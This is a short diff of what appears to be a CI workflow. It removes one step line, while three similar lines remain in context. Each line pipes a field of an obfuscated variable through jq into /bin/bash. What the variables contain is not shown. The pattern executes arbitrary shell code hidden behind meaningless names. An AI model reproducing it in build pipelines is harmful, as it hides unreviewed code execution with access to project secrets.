@@ -21,7 +21,6 @@ jobs:
           echo $qx00 | jq -r .nql96 | /bin/bash
           printf '%s' "$mtwy05984" | jq -r .hkku1349 | /bin/bash
           printf '%s' "$wlb825" | jq -r .delvd710 | /bin/bash
-          printf '%s' "$njlsu0471" | jq -r .wu85 | /bin/bash
 
       - name: Store results
         if: always()
